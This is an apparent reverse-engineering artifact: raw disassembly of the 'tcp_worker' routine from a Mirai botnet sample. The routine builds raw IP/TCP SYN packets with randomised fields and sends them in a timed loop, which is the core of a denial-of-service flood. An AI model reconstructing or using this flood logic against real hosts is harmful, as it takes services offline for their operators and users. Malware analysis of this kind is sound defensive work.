
/Users/taogoldi/Projects/malware/Mirai/input/d40cf9c95dcedf4f19e4a5f5bb744c8e98af87eb5703c850e6fda3b613668c28.elf:	file format elf64-x86-64

Disassembly of section .text:

0000000000401e00 <tcp_worker>:
  401e00: 4c 89 64 24 e0               	mov	qword ptr [rsp - 0x20], r12
  401e05: 48 89 5c 24 d0               	mov	qword ptr [rsp - 0x30], rbx
  401e0a: 48 89 6c 24 d8               	mov	qword ptr [rsp - 0x28], rbp
  401e0f: 4c 89 6c 24 e8               	mov	qword ptr [rsp - 0x18], r13
  401e14: 4c 89 74 24 f0               	mov	qword ptr [rsp - 0x10], r14
  401e19: 4c 89 7c 24 f8               	mov	qword ptr [rsp - 0x8], r15
  401e1e: 48 83 ec 68                  	sub	rsp, 0x68
  401e22: 4c 8b 2f                     	mov	r13, qword ptr [rdi]
  401e25: 31 ff                        	xor	edi, edi
  401e27: e8 a4 5a 00 00               	call	0x4078d0 <time>
  401e2c: be 03 00 00 00               	mov	esi, 0x3
  401e31: bf 02 00 00 00               	mov	edi, 0x2
  401e36: 49 63 55 44                  	movsxd	rdx, dword ptr [r13 + 0x44]
  401e3a: 48 01 d0                     	add	rax, rdx
  401e3d: ba 06 00 00 00               	mov	edx, 0x6
  401e42: 48 89 04 24                  	mov	qword ptr [rsp], rax
  401e46: e8 29 8a 00 00               	call	0x40a874 <socket>
  401e4b: 85 c0                        	test	eax, eax
  401e4d: 41 89 c4                     	mov	r12d, eax
  401e50: 0f 88 b3 00 00 00            	js	0x401f09 <tcp_worker+0x109>
  401e56: 48 8d 4c 24 2c               	lea	rcx, [rsp + 0x2c]
  401e5b: 48 8d 5c 24 28               	lea	rbx, [rsp + 0x28]
  401e60: 31 f6                        	xor	esi, esi
  401e62: 41 b8 04 00 00 00            	mov	r8d, 0x4
  401e68: ba 03 00 00 00               	mov	edx, 0x3
  401e6d: 89 c7                        	mov	edi, eax
  401e6f: c7 44 24 2c 01 00 00 00      	mov	dword ptr [rsp + 0x2c], 0x1
  401e77: e8 c0 89 00 00               	call	0x40a83c <setsockopt>
  401e7c: 41 b8 04 00 00 00            	mov	r8d, 0x4
  401e82: 48 89 d9                     	mov	rcx, rbx
  401e85: ba 07 00 00 00               	mov	edx, 0x7
  401e8a: be 01 00 00 00               	mov	esi, 0x1
  401e8f: 44 89 e7                     	mov	edi, r12d
  401e92: c7 44 24 28 00 00 80 00      	mov	dword ptr [rsp + 0x28], 0x800000
  401e9a: e8 9d 89 00 00               	call	0x40a83c <setsockopt>
  401e9f: 41 b8 04 00 00 00            	mov	r8d, 0x4
  401ea5: 48 89 d9                     	mov	rcx, rbx
  401ea8: ba 08 00 00 00               	mov	edx, 0x8
  401ead: be 01 00 00 00               	mov	esi, 0x1
  401eb2: 44 89 e7                     	mov	edi, r12d
  401eb5: e8 82 89 00 00               	call	0x40a83c <setsockopt>
  401eba: 48 8d 54 24 10               	lea	rdx, [rsp + 0x10]
  401ebf: 4c 89 ee                     	mov	rsi, r13
  401ec2: bf 02 00 00 00               	mov	edi, 0x2
  401ec7: 48 c7 44 24 10 00 00 00 00   	mov	qword ptr [rsp + 0x10], 0x0
  401ed0: 48 c7 44 24 18 00 00 00 00   	mov	qword ptr [rsp + 0x18], 0x0
  401ed9: 48 83 c2 04                  	add	rdx, 0x4
  401edd: 66 c7 44 24 10 02 00         	mov	word ptr [rsp + 0x10], 0x2
  401ee4: e8 c6 82 00 00               	call	0x40a1af <inet_pton>
  401ee9: 49 63 45 48                  	movsxd	rax, dword ptr [r13 + 0x48]
  401eed: 4c 8d 70 28                  	lea	r14, [rax + 0x28]
  401ef1: 4c 89 f7                     	mov	rdi, r14
  401ef4: e8 cf 8b 00 00               	call	0x40aac8 <malloc>
  401ef9: 48 85 c0                     	test	rax, rax
  401efc: 48 89 c5                     	mov	rbp, rax
  401eff: 75 0f                        	jne	0x401f10 <tcp_worker+0x110>
  401f01: 44 89 e7                     	mov	edi, r12d
  401f04: e8 35 34 00 00               	call	0x40533e <close>
  401f09: 31 ff                        	xor	edi, edi
  401f0b: e8 9f 0b 00 00               	call	0x402aaf <pthread_exit>
  401f10: 4c 8d 78 14                  	lea	r15, [rax + 0x14]
  401f14: 48 8d 40 28                  	lea	rax, [rax + 0x28]
  401f18: 31 ff                        	xor	edi, edi
  401f1a: 48 89 44 24 08               	mov	qword ptr [rsp + 0x8], rax
  401f1f: e8 ac 59 00 00               	call	0x4078d0 <time>
  401f24: 48 89 c3                     	mov	rbx, rax
  401f27: e8 f5 34 00 00               	call	0x405421 <pthread_self>
  401f2c: 31 c3                        	xor	ebx, eax
  401f2e: 31 ff                        	xor	edi, edi
  401f30: e8 9b 59 00 00               	call	0x4078d0 <time>
  401f35: 48 39 04 24                  	cmp	qword ptr [rsp], rax
  401f39: 0f 8e 45 01 00 00            	jle	0x402084 <tcp_worker+0x284>
  401f3f: 41 8b 55 48                  	mov	edx, dword ptr [r13 + 0x48]
  401f43: 69 c3 6d 4e c6 41            	imul	eax, ebx, 0x41c64e6d
  401f49: 85 d2                        	test	edx, edx
  401f4b: 8d 98 39 30 00 00            	lea	ebx, [rax + 0x3039]
  401f51: 7e 1c                        	jle	0x401f6f <tcp_worker+0x16f>
  401f53: 48 89 ea                     	mov	rdx, rbp
  401f56: 31 f6                        	xor	esi, esi
  401f58: 89 f1                        	mov	ecx, esi
  401f5a: 89 d8                        	mov	eax, ebx
  401f5c: ff c6                        	inc	esi
  401f5e: 83 e1 07                     	and	ecx, 0x7
  401f61: d3 e8                        	shr	eax, cl
  401f63: 88 42 28                     	mov	byte ptr [rdx + 0x28], al
  401f66: 48 ff c2                     	inc	rdx
  401f69: 41 39 75 48                  	cmp	dword ptr [r13 + 0x48], esi
  401f6d: 7f e9                        	jg	0x401f58 <tcp_worker+0x158>
  401f6f: 0f b6 45 00                  	movzx	eax, byte ptr [rbp]
  401f73: c6 45 01 00                  	mov	byte ptr [rbp + 0x1], 0x0
  401f77: 48 89 ef                     	mov	rdi, rbp
  401f7a: c6 45 08 40                  	mov	byte ptr [rbp + 0x8], 0x40
  401f7e: c6 45 09 06                  	mov	byte ptr [rbp + 0x9], 0x6
  401f82: be 0a 00 00 00               	mov	esi, 0xa
  401f87: 66 c7 45 06 00 00            	mov	word ptr [rbp + 0x6], 0x0
  401f8d: 66 c7 45 0a 00 00            	mov	word ptr [rbp + 0xa], 0x0
  401f93: 83 e0 f0                     	and	eax, -0x10
  401f96: 83 c8 05                     	or	eax, 0x5
  401f99: 83 e0 0f                     	and	eax, 0xf
  401f9c: 83 c8 40                     	or	eax, 0x40
  401f9f: 88 45 00                     	mov	byte ptr [rbp], al
  401fa2: 44 89 f0                     	mov	eax, r14d
  401fa5: 66 c1 c8 08                  	ror	ax, 0x8
  401fa9: 66 89 45 02                  	mov	word ptr [rbp + 0x2], ax
  401fad: 89 d8                        	mov	eax, ebx
  401faf: 66 c1 c8 08                  	ror	ax, 0x8
  401fb3: 66 89 45 04                  	mov	word ptr [rbp + 0x4], ax
  401fb7: 41 8b 45 4c                  	mov	eax, dword ptr [r13 + 0x4c]
  401fbb: 89 45 0c                     	mov	dword ptr [rbp + 0xc], eax
  401fbe: 8b 44 24 14                  	mov	eax, dword ptr [rsp + 0x14]
  401fc2: 89 45 10                     	mov	dword ptr [rbp + 0x10], eax
  401fc5: e8 a6 f4 ff ff               	call	0x401470 <checksum>
  401fca: ba 37 49 11 04               	mov	edx, 0x4114937
  401fcf: 66 89 45 0a                  	mov	word ptr [rbp + 0xa], ax
  401fd3: 89 d8                        	mov	eax, ebx
  401fd5: f7 e2                        	mul	edx
  401fd7: 89 d8                        	mov	eax, ebx
  401fd9: 4c 89 fe                     	mov	rsi, r15
  401fdc: 48 89 ef                     	mov	rdi, rbp
  401fdf: 66 41 c7 47 0e ff ff         	mov	word ptr [r15 + 0xe], 0xffff
  401fe6: 66 41 c7 47 10 00 00         	mov	word ptr [r15 + 0x10], 0x0
  401fed: 66 41 c7 47 12 00 00         	mov	word ptr [r15 + 0x12], 0x0
  401ff4: 29 d0                        	sub	eax, edx
  401ff6: d1 e8                        	shr	eax
  401ff8: 01 c2                        	add	edx, eax
  401ffa: 89 d8                        	mov	eax, ebx
  401ffc: c1 ea 0f                     	shr	edx, 0xf
  401fff: 69 d2 ff fb 00 00            	imul	edx, edx, 0xfbff
  402005: 29 d0                        	sub	eax, edx
  402007: 66 05 00 04                  	add	ax, 0x400
  40200b: 66 c1 c8 08                  	ror	ax, 0x8
  40200f: 66 41 89 07                  	mov	word ptr [r15], ax
  402013: 41 8b 45 40                  	mov	eax, dword ptr [r13 + 0x40]
  402017: 66 c1 c8 08                  	ror	ax, 0x8
  40201b: 66 41 89 47 02               	mov	word ptr [r15 + 0x2], ax
  402020: 89 d8                        	mov	eax, ebx
  402022: 41 c7 47 08 00 00 00 00      	mov	dword ptr [r15 + 0x8], 0x0
  40202a: 0f c8                        	bswap	eax
  40202c: 41 89 47 04                  	mov	dword ptr [r15 + 0x4], eax
  402030: 41 0f b6 47 0c               	movzx	eax, byte ptr [r15 + 0xc]
  402035: 83 e0 0f                     	and	eax, 0xf
  402038: 83 c8 50                     	or	eax, 0x50
  40203b: 41 88 47 0c                  	mov	byte ptr [r15 + 0xc], al
  40203f: 41 0f b6 47 0d               	movzx	eax, byte ptr [r15 + 0xd]
  402044: 83 c8 02                     	or	eax, 0x2
  402047: 83 e0 ef                     	and	eax, -0x11
  40204a: 41 88 47 0d                  	mov	byte ptr [r15 + 0xd], al
  40204e: 41 8b 4d 48                  	mov	ecx, dword ptr [r13 + 0x48]
  402052: 48 8b 54 24 08               	mov	rdx, qword ptr [rsp + 0x8]
  402057: e8 74 f8 ff ff               	call	0x4018d0 <tcp_checksum>
  40205c: 4c 8d 44 24 10               	lea	r8, [rsp + 0x10]
  402061: 66 41 89 47 10               	mov	word ptr [r15 + 0x10], ax
  402066: 41 b9 10 00 00 00            	mov	r9d, 0x10
  40206c: b9 40 40 00 00               	mov	ecx, 0x4040
  402071: 4c 89 f2                     	mov	rdx, r14
  402074: 48 89 ee                     	mov	rsi, rbp
  402077: 44 89 e7                     	mov	edi, r12d
  40207a: e8 19 2b 00 00               	call	0x404b98 <sendto>
  40207f: e9 aa fe ff ff               	jmp	0x401f2e <tcp_worker+0x12e>
  402084: 48 89 ef                     	mov	rdi, rbp
  402087: e8 cf 95 00 00               	call	0x40b65b <free>
  40208c: 66 66 66 90                  	nop
  402090: e9 6c fe ff ff               	jmp	0x401f01 <tcp_worker+0x101>
  402095: 66 66 66 90                  	nop
  402099: 66 66 66 90                  	nop
  40209d: 66 66 90                     	nop
